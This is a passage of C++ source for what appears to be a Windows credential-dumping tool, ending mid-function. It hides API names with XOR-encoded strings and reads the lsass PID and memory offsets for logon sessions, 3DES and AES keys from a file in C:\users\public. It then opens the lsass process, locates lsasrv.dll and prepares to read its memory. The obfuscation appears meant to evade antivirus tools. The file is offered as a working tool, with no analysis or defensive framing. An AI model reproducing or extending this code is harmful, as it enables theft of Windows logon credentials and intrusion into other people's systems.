#include <Windows.h>

#include <winternl.h> 




inline void FBXorCrypt(char* str, size_t len) {

    int intArr[100];
    for (int i = 0; i < 100; i++) {
        intArr[i] = 1;// 1//, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };

    }
    int i;

    for (i = 0; i < len; i++) {

        str[i] = intArr[i] ^ str[i];

    }

}
inline void MYS_ecureZeroMemory(char* fuck, int number) {

    for (int i = 0; i < number; i++) {

        fuck[i] = 0;

    }

}

typedef

FARPROC

(NTAPI* PNT_GetProcAddress)(

    HMODULE hModule,

    LPCSTR  lpProcName

    );



typedef

HMODULE

(NTAPI* PNT_LoadLibraryA)(

    LPCSTR lpLibFileName

    );



typedef

HANDLE

(NTAPI* PNT_CreateFileA)(

    LPCSTR                lpFileName,

    DWORD                 dwDesiredAccess,

    DWORD                 dwShareMode,

    LPSECURITY_ATTRIBUTES lpSecurityAttributes,

    DWORD                 dwCreationDisposition,

    DWORD                 dwFlagsAndAttributes,

    HANDLE                hTemplateFile

    );



typedef

HFILE

(NTAPI* PNT_OpenFile)(

    LPCSTR     lpFileName,

    LPOFSTRUCT lpReOpenBuff,

    UINT       uStyle

    );



typedef

BOOL

(NTAPI* PNT_ReadFile)(

    HANDLE       hFile,

    LPVOID       lpBuffer,

    DWORD        nNumberOfBytesToRead,

    LPDWORD      lpNumberOfBytesRead,

    LPOVERLAPPED lpOverlapped

    );



typedef

HANDLE

(NTAPI* PNT_OpenProcess)(

    DWORD dwDesiredAccess,

    BOOL  bInheritHandle,

    DWORD dwProcessId

    );



typedef

BOOL

(NTAPI* PNT_EnumProcessModules)(

    HANDLE  hProcess,

    HMODULE* lphModule,

    DWORD   cb,

    LPDWORD lpcbNeeded

    );



typedef

DWORD

(NTAPI* PNT_GetModuleFileNameExA)(

    HANDLE  hProcess,

    HMODULE hModule,

    LPSTR   lpFilename,

    DWORD   nSize

    );



typedef

BOOL

(NTAPI* PNT_ReadProcessMemory)(

    HANDLE  hProcess,

    LPCVOID lpBaseAddress,

    LPVOID  lpBuffer,

    SIZE_T  nSize,

    SIZE_T* lpNumberOfBytesRead

    );





typedef

HANDLE

(NTAPI* PNT_GetCurrentProcess)(

    );



typedef

BOOL

(NTAPI* PNT_WriteFile)(

    HANDLE       hFile,

    LPCVOID      lpBuffer,

    DWORD        nNumberOfBytesToWrite,

    LPDWORD      lpNumberOfBytesWritten,

    LPOVERLAPPED lpOverlapped

    );



typedef

BOOL

(NTAPI* PNT_CloseHandle)(

    HANDLE       hObject

    );





#define TABLE_LENGTH 1024

#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)





inline bool _compare_kernel32_name(WORD len, WCHAR* dll_name) {

    // kernel32char

    // wcharchar00

    // len/2\0,kernel32.dll12

    char DTwew[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };

    if (len / 2 != 12)return false;

    for (int i = 0; i < len / 2; i++) {

        char c;

        TO_LOWERCASE(c, dll_name[i]);

        if (c != DTwew[i])return false;

    }

    return true;

}





inline bool _compare_psapi_name(WORD len, WCHAR* dll_name) {

    // kernel32char

    // wcharchar00

    // len/2\0,kernel32.dll12

    char DTwew[] = { 'p','s','a','p','i','.','d','l','l',0 };

    if (len / 2 != 9)return false;

    for (int i = 0; i < len / 2; i++) {

        char c;

        TO_LOWERCASE(c, dll_name[i]);

        if (c != DTwew[i])return false;

    }

    return true;

}





inline bool _compare_lsass_name(char* dll_name) {

    // char oyctO[] = { 'l','s','a','s','s','.','e','x','e',0 }; 

    char oyctO[] = { 'i','m','m','3','2','.','d','l','l',0 };

    for (int i = 0; (dll_name[i] != 0) && (i < 9); i++) {

        char c;

        TO_LOWERCASE(c, dll_name[i]);

        if (c != oyctO[i])return false;

    }

    return true;

}



inline DWORD64 _return_hex_value(char _hex_char) {

    if (_hex_char == '0') {

        return 0;

    }

    if (_hex_char == '1') {

        return 1;

    }

    if (_hex_char == '2') {

        return 2;

    }

    if (_hex_char == '3') {

        return 3;

    }

    if (_hex_char == '4') {

        return 4;

    }

    if (_hex_char == '5') {

        return 5;

    }

    if (_hex_char == '6') {

        return 6;

    }

    if (_hex_char == '7') {

        return 7;

    }

    if (_hex_char == '8') {

        return 8;

    }

    if (_hex_char == '9') {

        return 9;

    }

    if (_hex_char == 'a') {

        return 10;

    }

    if (_hex_char == 'b') {

        return 11;

    }

    if (_hex_char == 'c') {

        return 12;

    }

    if (_hex_char == 'd') {

        return 13;

    }

    if (_hex_char == 'e') {

        return 14;

    }

    if (_hex_char == 'f') {

        return 15;

    }



}



inline bool _compare_lsasrv_name(char* dll_name) {

    // char zGlRm[] = { 'l','s','a','s','r','v','.','d','l','l',0 }; 

    char zGlRm[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };

    // for (int i = 0; (dll_name[i] != 0) && (i < 10); i++) {

    for (int i = 0; (dll_name[i] != 0) && (i < 12); i++) {

        char c;

        TO_LOWERCASE(c, dll_name[i]);

        if (c != zGlRm[i])return false;

    }

    return true;

    //TO_LOWERCASE

}





int main() {

    DWORD64 _kernel32_base_addr = 0;

    DWORD64 _psapi_base_addr = 0;

    char stack_string[100];

    char _dbg_string[100];
    char _fuckingstring[100];

    MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'k'; _dbg_string[1] = 'e'; _dbg_string[2] = 'r'; _dbg_string[3] = 'n'; _dbg_string[4] = 'e'; _dbg_string[5] = 'l'; _dbg_string[6] = '3'; _dbg_string[7] = '2'; _dbg_string[8] = '.'; _dbg_string[9] = 'd'; _dbg_string[10] = 'l'; _dbg_string[11] = 'l';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 106; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 111; _fuckingstring[4] = 100; _fuckingstring[5] = 109; _fuckingstring[6] = 50; _fuckingstring[7] = 51; _fuckingstring[8] = 47; _fuckingstring[9] = 101; _fuckingstring[10] = 109; _fuckingstring[11] = 109; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
    HMODULE ahndleeeeer = GetModuleHandleA(_fuckingstring);

    _kernel32_base_addr = reinterpret_cast<DWORD64>(ahndleeeeer);

    MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'L'; _dbg_string[1] = 'o'; _dbg_string[2] = 'a'; _dbg_string[3] = 'd'; _dbg_string[4] = 'L'; _dbg_string[5] = 'i'; _dbg_string[6] = 'b'; _dbg_string[7] = 'r'; _dbg_string[8] = 'a'; _dbg_string[9] = 'r'; _dbg_string[10] = 'y'; _dbg_string[11] = 'A';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 77; _fuckingstring[1] = 110; _fuckingstring[2] = 96; _fuckingstring[3] = 101; _fuckingstring[4] = 77; _fuckingstring[5] = 104; _fuckingstring[6] = 99; _fuckingstring[7] = 115; _fuckingstring[8] = 96; _fuckingstring[9] = 115; _fuckingstring[10] = 120; _fuckingstring[11] = 64; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
    PNT_LoadLibraryA NT_LoadLibraryA = (PNT_LoadLibraryA)GetProcAddress(ahndleeeeer, _fuckingstring);

    MYS_ecureZeroMemory(_dbg_string, 100); _dbg_string[0] = 'G'; _dbg_string[1] = 'e'; _dbg_string[2] = 't'; _dbg_string[3] = 'P'; _dbg_string[4] = 'r'; _dbg_string[5] = 'o'; _dbg_string[6] = 'c'; _dbg_string[7] = 'A'; _dbg_string[8] = 'd'; _dbg_string[9] = 'd'; _dbg_string[10] = 'r'; _dbg_string[11] = 'e'; _dbg_string[12] = 's'; _dbg_string[13] = 's';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 70; _fuckingstring[1] = 100; _fuckingstring[2] = 117; _fuckingstring[3] = 81; _fuckingstring[4] = 115; _fuckingstring[5] = 110; _fuckingstring[6] = 98; _fuckingstring[7] = 64; _fuckingstring[8] = 101; _fuckingstring[9] = 101; _fuckingstring[10] = 115; _fuckingstring[11] = 100; _fuckingstring[12] = 114; _fuckingstring[13] = 114; _fuckingstring[14] = 1; FBXorCrypt(_fuckingstring, 15);
    PNT_GetProcAddress NT_GetProcAddress = (PNT_GetProcAddress)GetProcAddress(ahndleeeeer, _fuckingstring);



    // 



    // kernel32CreateFileA/ReadFile

    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'C'; stack_string[1] = 'r'; stack_string[2] = 'e'; stack_string[3] = 'a'; stack_string[4] = 't'; stack_string[5] = 'e'; stack_string[6] = 'F'; stack_string[7] = 'i'; stack_string[8] = 'l'; stack_string[9] = 'e'; stack_string[10] = 'A';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 115; _fuckingstring[2] = 100; _fuckingstring[3] = 96; _fuckingstring[4] = 117; _fuckingstring[5] = 100; _fuckingstring[6] = 71; _fuckingstring[7] = 104; _fuckingstring[8] = 109; _fuckingstring[9] = 100; _fuckingstring[10] = 64; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
    PNT_CreateFileA NT_CreateFileA = (PNT_CreateFileA)NT_GetProcAddress((HMODULE)_kernel32_base_addr, _fuckingstring);

    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'R'; stack_string[1] = 'e'; stack_string[2] = 'a'; stack_string[3] = 'd'; stack_string[4] = 'F'; stack_string[5] = 'i'; stack_string[6] = 'l'; stack_string[7] = 'e';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 83; _fuckingstring[1] = 100; _fuckingstring[2] = 96; _fuckingstring[3] = 101; _fuckingstring[4] = 71; _fuckingstring[5] = 104; _fuckingstring[6] = 109; _fuckingstring[7] = 100; _fuckingstring[8] = 1; FBXorCrypt(_fuckingstring, 9);
    PNT_ReadFile NT_ReadFile = (PNT_ReadFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, _fuckingstring);





    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'C'; stack_string[1] = 'l'; stack_string[2] = 'o'; stack_string[3] = 's'; stack_string[4] = 'e'; stack_string[5] = 'H'; stack_string[6] = 'a'; stack_string[7] = 'n'; stack_string[8] = 'd'; stack_string[9] = 'l'; stack_string[10] = 'e';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 109; _fuckingstring[2] = 110; _fuckingstring[3] = 114; _fuckingstring[4] = 100; _fuckingstring[5] = 73; _fuckingstring[6] = 96; _fuckingstring[7] = 111; _fuckingstring[8] = 101; _fuckingstring[9] = 109; _fuckingstring[10] = 100; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
    PNT_CloseHandle NT_CloseHandle = (PNT_CloseHandle)NT_GetProcAddress((HMODULE)_kernel32_base_addr, _fuckingstring);



    // 

    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'i'; stack_string[17] = 'l'; stack_string[18] = 'i'; stack_string[19] = '6'; stack_string[20] = 'a'; stack_string[21] = 'o';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
    HANDLE hFile = NT_CreateFileA(_fuckingstring,               // file to open

        GENERIC_READ,          // open for reading

        FILE_SHARE_READ,       // share for reading

        NULL,                  // default security

        OPEN_EXISTING,         // existing file only

        FILE_ATTRIBUTE_NORMAL, // normal file

        NULL);

    if (INVALID_HANDLE_VALUE == hFile)  return 0;

    // 

    MYS_ecureZeroMemory(stack_string, 50);

    DWORD out = 0;

    if (NT_ReadFile(hFile, stack_string,

        50,

        &out,

        NULL

    ) == FALSE)

        return 0;



    // 

    NT_CloseHandle(hFile);





    // table1001000

    // 3

    // shellcode

    // shellcode

   // DWORD _index = (stack_string[0] - '0') * 100 + (stack_string[1] - '0') * 10 + (stack_string[2] - '0');





    // 7lsass.exePID

    DWORD _lsass_pid = (stack_string[3] - '0') * 1000000 + (stack_string[4] - '0') * 100000 +

        (stack_string[5] - '0') * 10000 + (stack_string[6] - '0') * 1000 +

        (stack_string[7] - '0') * 100 + (stack_string[8] - '0') * 10 +

        (stack_string[9] - '0');







    // offset

    DWORD64 _logon_session_list_offset =

        _return_hex_value(stack_string[10]) << 28;

    _logon_session_list_offset +=

        _return_hex_value(stack_string[11]) << 24;

    _logon_session_list_offset +=

        _return_hex_value(stack_string[12]) << 20;

    _logon_session_list_offset +=

        _return_hex_value(stack_string[13]) << 16;

    _logon_session_list_offset +=

        _return_hex_value(stack_string[14]) << 12;

    _logon_session_list_offset +=

        _return_hex_value(stack_string[15]) << 8;

    _logon_session_list_offset +=

        _return_hex_value(stack_string[16]) << 4;

    _logon_session_list_offset +=

        _return_hex_value(stack_string[17]);





    DWORD64 _3des_key_offset =

        _return_hex_value(stack_string[8 + 10]) << 28;

    _3des_key_offset +=

        _return_hex_value(stack_string[8 + 11]) << 24;

    _3des_key_offset +=

        _return_hex_value(stack_string[8 + 12]) << 20;

    _3des_key_offset +=

        _return_hex_value(stack_string[8 + 13]) << 16;

    _3des_key_offset +=

        _return_hex_value(stack_string[8 + 14]) << 12;

    _3des_key_offset +=

        _return_hex_value(stack_string[8 + 15]) << 8;

    _3des_key_offset +=

        _return_hex_value(stack_string[8 + 16]) << 4;

    _3des_key_offset +=

        _return_hex_value(stack_string[8 + 17]);





    DWORD64 _aes_key_offset =

        _return_hex_value(stack_string[8 + 8 + 10]) << 28;

    _aes_key_offset +=

        _return_hex_value(stack_string[8 + 8 + 11]) << 24;

    _aes_key_offset +=

        _return_hex_value(stack_string[8 + 8 + 12]) << 20;

    _aes_key_offset +=

        _return_hex_value(stack_string[8 + 8 + 13]) << 16;

    _aes_key_offset +=

        _return_hex_value(stack_string[8 + 8 + 14]) << 12;

    _aes_key_offset +=

        _return_hex_value(stack_string[8 + 8 + 15]) << 8;

    _aes_key_offset +=

        _return_hex_value(stack_string[8 + 8 + 16]) << 4;

    _aes_key_offset +=

        _return_hex_value(stack_string[8 + 8 + 17]);





    DWORD64 _credential_offset =

        _return_hex_value(stack_string[8 + 8 + 8 + 10]) << 28;

    _credential_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 11]) << 24;

    _credential_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 12]) << 20;

    _credential_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 13]) << 16;

    _credential_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 14]) << 12;

    _credential_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 15]) << 8;

    _credential_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 16]) << 4;

    _credential_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 17]);



    // 2byte

    WORD _3des_aes_len_offset =

        _return_hex_value(stack_string[8 + 8 + 8 + 8 + 10]) << 4;

    _3des_aes_len_offset +=

        _return_hex_value(stack_string[8 + 8 + 8 + 8 + 11]);



    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'O'; stack_string[1] = 'p'; stack_string[2] = 'e'; stack_string[3] = 'n'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 78; _fuckingstring[1] = 113; _fuckingstring[2] = 100; _fuckingstring[3] = 111; _fuckingstring[4] = 81; _fuckingstring[5] = 115; _fuckingstring[6] = 110; _fuckingstring[7] = 98; _fuckingstring[8] = 100; _fuckingstring[9] = 114; _fuckingstring[10] = 114; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
    PNT_OpenProcess NT_OpenProcess = (PNT_OpenProcess)NT_GetProcAddress((HMODULE)_kernel32_base_addr, _fuckingstring);

    HANDLE _lsass_handle = NT_OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _lsass_pid);



    if (INVALID_HANDLE_VALUE == _lsass_handle)  return 0;



    HMODULE lsassDll[1024];

    DWORD bytesReturned;

    char modName[50];

    char* lsass = NULL, * lsasrv = NULL;



    // EnumProcessModulesGetModuleFileNameExApsapi.dll

    HMODULE _psapi_module;

    if (!_psapi_base_addr) {

        MYS_ecureZeroMemory(stack_string, 50);

        stack_string[0] = 'p'; stack_string[1] = 's'; stack_string[2] = 'a'; stack_string[3] = 'p'; stack_string[4] = 'i'; stack_string[5] = '.'; stack_string[6] = 'd'; stack_string[7] = 'l'; stack_string[8] = 'l';

        MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 113; _fuckingstring[1] = 114; _fuckingstring[2] = 96; _fuckingstring[3] = 113; _fuckingstring[4] = 104; _fuckingstring[5] = 47; _fuckingstring[6] = 101; _fuckingstring[7] = 109; _fuckingstring[8] = 109; _fuckingstring[9] = 1; FBXorCrypt(_fuckingstring, 10);
        _psapi_module = NT_LoadLibraryA(_fuckingstring);

    }

    else

        _psapi_module = (HMODULE)_psapi_base_addr;



    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'E'; stack_string[1] = 'n'; stack_string[2] = 'u'; stack_string[3] = 'm'; stack_string[4] = 'P'; stack_string[5] = 'r'; stack_string[6] = 'o'; stack_string[7] = 'c'; stack_string[8] = 'e'; stack_string[9] = 's'; stack_string[10] = 's'; stack_string[11] = 'M'; stack_string[12] = 'o'; stack_string[13] = 'd'; stack_string[14] = 'u'; stack_string[15] = 'l'; stack_string[16] = 'e'; stack_string[17] = 's';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 111; _fuckingstring[2] = 116; _fuckingstring[3] = 108; _fuckingstring[4] = 81; _fuckingstring[5] = 115; _fuckingstring[6] = 110; _fuckingstring[7] = 98; _fuckingstring[8] = 100; _fuckingstring[9] = 114; _fuckingstring[10] = 114; _fuckingstring[11] = 76; _fuckingstring[12] = 110; _fuckingstring[13] = 101; _fuckingstring[14] = 116; _fuckingstring[15] = 109; _fuckingstring[16] = 100; _fuckingstring[17] = 114; _fuckingstring[18] = 1; FBXorCrypt(_fuckingstring, 19);
    PNT_EnumProcessModules NT_EnumProcessModules = (PNT_EnumProcessModules)NT_GetProcAddress(_psapi_module, _fuckingstring);



    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'G'; stack_string[1] = 'e'; stack_string[2] = 't'; stack_string[3] = 'M'; stack_string[4] = 'o'; stack_string[5] = 'd'; stack_string[6] = 'u'; stack_string[7] = 'l'; stack_string[8] = 'e'; stack_string[9] = 'F'; stack_string[10] = 'i'; stack_string[11] = 'l'; stack_string[12] = 'e'; stack_string[13] = 'N'; stack_string[14] = 'a'; stack_string[15] = 'm'; stack_string[16] = 'e'; stack_string[17] = 'E'; stack_string[18] = 'x'; stack_string[19] = 'A';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 70; _fuckingstring[1] = 100; _fuckingstring[2] = 117; _fuckingstring[3] = 76; _fuckingstring[4] = 110; _fuckingstring[5] = 101; _fuckingstring[6] = 116; _fuckingstring[7] = 109; _fuckingstring[8] = 100; _fuckingstring[9] = 71; _fuckingstring[10] = 104; _fuckingstring[11] = 109; _fuckingstring[12] = 100; _fuckingstring[13] = 79; _fuckingstring[14] = 96; _fuckingstring[15] = 108; _fuckingstring[16] = 100; _fuckingstring[17] = 68; _fuckingstring[18] = 121; _fuckingstring[19] = 64; _fuckingstring[20] = 1; FBXorCrypt(_fuckingstring, 21);
    PNT_GetModuleFileNameExA NT_GetModuleFileNameExA = (PNT_GetModuleFileNameExA)NT_GetProcAddress(_psapi_module, _fuckingstring);



    MYS_ecureZeroMemory(stack_string, 50);

    stack_string[0] = 'W'; stack_string[1] = 'r'; stack_string[2] = 'i'; stack_string[3] = 't'; stack_string[4] = 'e'; stack_string[5] = 'F'; stack_string[6] = 'i'; stack_string[7] = 'l'; stack_string[8] = 'e';

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 86; _fuckingstring[1] = 115; _fuckingstring[2] = 104; _fuckingstring[3] = 117; _fuckingstring[4] = 100; _fuckingstring[5] = 71; _fuckingstring[6] = 104; _fuckingstring[7] = 109; _fuckingstring[8] = 100; _fuckingstring[9] = 1; FBXorCrypt(_fuckingstring, 10);
    PNT_WriteFile NT_WriteFile = (PNT_WriteFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, _fuckingstring);









    if (NT_EnumProcessModules(_lsass_handle, lsassDll, sizeof(lsassDll), &bytesReturned)) {



#ifdef DEBU___G



        MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 79; _fuckingstring[1] = 85; _fuckingstring[2] = 94; _fuckingstring[3] = 68; _fuckingstring[4] = 111; _fuckingstring[5] = 116; _fuckingstring[6] = 108; _fuckingstring[7] = 81; _fuckingstring[8] = 115; _fuckingstring[9] = 110; _fuckingstring[10] = 98; _fuckingstring[11] = 100; _fuckingstring[12] = 114; _fuckingstring[13] = 114; _fuckingstring[14] = 76; _fuckingstring[15] = 110; _fuckingstring[16] = 101; _fuckingstring[17] = 116; _fuckingstring[18] = 109; _fuckingstring[19] = 100; _fuckingstring[20] = 114; _fuckingstring[21] = 33; _fuckingstring[22] = 114; _fuckingstring[23] = 116; _fuckingstring[24] = 98; _fuckingstring[25] = 98; _fuckingstring[26] = 100; _fuckingstring[27] = 100; _fuckingstring[28] = 101; _fuckingstring[29] = 11; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
        printf(_fuckingstring);

#endif // DEBU___G

        // For each DLL address, get its name so we can find what we are looking for

        for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {

            NT_GetModuleFileNameExA(_lsass_handle, lsassDll[i], modName, sizeof(modName));

            // OutputDebugStringA(modName);

#ifdef DEBU___G



            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 110; _fuckingstring[2] = 101; _fuckingstring[3] = 116; _fuckingstring[4] = 109; _fuckingstring[5] = 100; _fuckingstring[6] = 33; _fuckingstring[7] = 111; _fuckingstring[8] = 96; _fuckingstring[9] = 108; _fuckingstring[10] = 100; _fuckingstring[11] = 59; _fuckingstring[12] = 33; _fuckingstring[13] = 36; _fuckingstring[14] = 114; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
            printf(_fuckingstring, modName);

#endif // DEBU___G

            //  printf("module name: %s\n", modName);

              // (char*)lsassDll[i]

              // 

            int j = 0;

            for (;; j++) {

                if (modName[j] == '\0') break;

            }

            //j

            BOOL flag = 1;

            MYS_ecureZeroMemory(stack_string, 50);

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 109; _fuckingstring[1] = 114; _fuckingstring[2] = 96; _fuckingstring[3] = 114; _fuckingstring[4] = 114; _fuckingstring[5] = 47; _fuckingstring[6] = 100; _fuckingstring[7] = 121; _fuckingstring[8] = 100; _fuckingstring[9] = 1; FBXorCrypt(_fuckingstring, 10);
           // stack_string[0] = _fuckingstring;

            for (int k = 0; k < 9; k++) {

                if (_fuckingstring[8 - k] != modName[j - 1 - k]) {

                    flag = 0;

                    break;

                }

            }

            if (flag) {

                lsass = (char*)lsassDll[i];

                continue;

            }



            flag = 1;

            MYS_ecureZeroMemory(stack_string, 50);

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 109; _fuckingstring[1] = 114; _fuckingstring[2] = 96; _fuckingstring[3] = 114; _fuckingstring[4] = 115; _fuckingstring[5] = 119; _fuckingstring[6] = 47; _fuckingstring[7] = 101; _fuckingstring[8] = 109; _fuckingstring[9] = 109; _fuckingstring[10] = 1; FBXorCrypt(_fuckingstring, 11);
           // stack_string[100] = _fuckingstring;

            for (int k = 0; k < 10; k++) {

                // 

                if ((_fuckingstring[9 - k] != modName[j - 1 - k]) && (_fuckingstring[9 - k] - 32 != modName[j - 1 - k])) {

                    flag = 0;

                    break;

                }

            }



            if (flag) {

                lsasrv = (char*)lsassDll[i];

                continue;

            }

        }

    }



#ifdef DEBU___G



    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 100; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 98; _fuckingstring[7] = 110; _fuckingstring[8] = 101; _fuckingstring[9] = 100; _fuckingstring[10] = 33; _fuckingstring[11] = 36; _fuckingstring[12] = 121; _fuckingstring[13] = 11; _fuckingstring[14] = 1; FBXorCrypt(_fuckingstring, 15);
    printf(_fuckingstring, (unsigned int)GetLastError());

#endif // DEBU___G

    if ((!lsass) || (!lsasrv)) {

        // 



        //ZeroMemory(_123, 100);

        //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

        if (0 == lsasrv)

            // OutputDebugStringA("failed to locate  lsasrv\n");

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 96; _fuckingstring[2] = 104; _fuckingstring[3] = 109; _fuckingstring[4] = 100; _fuckingstring[5] = 101; _fuckingstring[6] = 33; _fuckingstring[7] = 117; _fuckingstring[8] = 110; _fuckingstring[9] = 33; _fuckingstring[10] = 109; _fuckingstring[11] = 110; _fuckingstring[12] = 98; _fuckingstring[13] = 96; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 33; _fuckingstring[17] = 33; _fuckingstring[18] = 109; _fuckingstring[19] = 114; _fuckingstring[20] = 96; _fuckingstring[21] = 114; _fuckingstring[22] = 114; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
        if (0 == lsass)  // OutputDebugStringA(_fuckingstring);

#ifdef DEBU___G



            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 114; _fuckingstring[1] = 110; _fuckingstring[2] = 108; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 106; _fuckingstring[6] = 100; _fuckingstring[7] = 120; _fuckingstring[8] = 33; _fuckingstring[9] = 108; _fuckingstring[10] = 110; _fuckingstring[11] = 101; _fuckingstring[12] = 116; _fuckingstring[13] = 109; _fuckingstring[14] = 100; _fuckingstring[15] = 33; _fuckingstring[16] = 111; _fuckingstring[17] = 110; _fuckingstring[18] = 117; _fuckingstring[19] = 33; _fuckingstring[20] = 109; _fuckingstring[21] = 110; _fuckingstring[22] = 98; _fuckingstring[23] = 96; _fuckingstring[24] = 117; _fuckingstring[25] = 100; _fuckingstring[26] = 101; _fuckingstring[27] = 11; _fuckingstring[28] = 1; FBXorCrypt(_fuckingstring, 29);
        printf(_fuckingstring);

#endif // DEBU___G

        return 0;

    }





    //ZeroMemory(_123, 100);

    //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

    // OutputDebugStringA(_123);



    // lsass



    // logonsessionList

    // lsasrv+_logon_session_list_offset+7

    // lsasrv+_logon_session_list_offset+3DWORD



    MYS_ecureZeroMemory(stack_string, 50);



    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 83; _fuckingstring[1] = 100; _fuckingstring[2] = 96; _fuckingstring[3] = 101; _fuckingstring[4] = 81; _fuckingstring[5] = 115; _fuckingstring[6] = 110; _fuckingstring[7] = 98; _fuckingstring[8] = 100; _fuckingstring[9] = 114; _fuckingstring[10] = 114; _fuckingstring[11] = 76; _fuckingstring[12] = 100; _fuckingstring[13] = 108; _fuckingstring[14] = 110; _fuckingstring[15] = 115; _fuckingstring[16] = 120; _fuckingstring[17] = 1; FBXorCrypt(_fuckingstring, 18);
    PNT_ReadProcessMemory NT_ReadProcessMemory = (PNT_ReadProcessMemory)NT_GetProcAddress((HMODULE)_kernel32_base_addr, _fuckingstring);

    SIZE_T bytesRead = 0;

    MYS_ecureZeroMemory(stack_string, 50);

#ifdef DEBUG

